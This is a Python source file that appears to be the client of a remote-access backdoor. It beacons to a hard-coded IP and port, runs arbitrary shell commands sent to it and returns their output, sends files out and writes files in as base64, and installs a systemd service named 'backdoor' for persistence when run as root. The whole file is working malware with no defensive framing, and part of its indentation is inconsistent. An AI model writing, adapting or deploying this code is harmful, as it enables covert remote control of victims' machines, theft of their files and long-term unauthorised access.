import socket
import subprocess
import json
import os
import base64
import time



def connection():
	"""Function that will allow client to connect to server. This Function will attempt to beacon back to the server at specified interval default=20 seconds for testing"""
    while True:
        time.sleep(20)
	try:
	    sock.connect(("192.168.159.133", 1526))
	    shell()
	except:
	    connection()
	    
def send(data):
    """Responsible for sending data"""
    json_data = json.dumps(data)
    sock.send(json_data)


def receive():
    """Responsible for receiving data"""
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue


def shell():
    """Managing the shell commands sent to it."""
    while True:
        command = receive()
        if command == "":
            continue

        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                send(base64.b64encode(file.read()))

        elif command[:6] == "upload":
            with open(command[7:], "wb") as uload:
                file_data = receive()
                uload.write(base64.b64decode(file_data))

        elif command == 'detach':
            continue

        elif command == "quit":
            sock.close()
            break
        elif command == "persist":
            try:
                if os.geteuid() == 0:
                    os.system("echo '[Unit]\nDescription=Very Important backdoor.\n\n\n["
                              "Service]\nType=simple\nExecStartPre=/bin/sleep "
                              "30\nExecStart=/usr/bin/python /home/kris/Downloads/entangled-master/client.py\n\n["
                              "Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service")
                    os.system("systemctl daemon-reload")
                    #os.system("systemctl start backdoor")
                else:
                    print("I am not root")
            except AttributeError as a:
                continue


        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
            except :
                continue

        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            results = proc.stdout.read() + proc.stderr.read()
            send(results)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()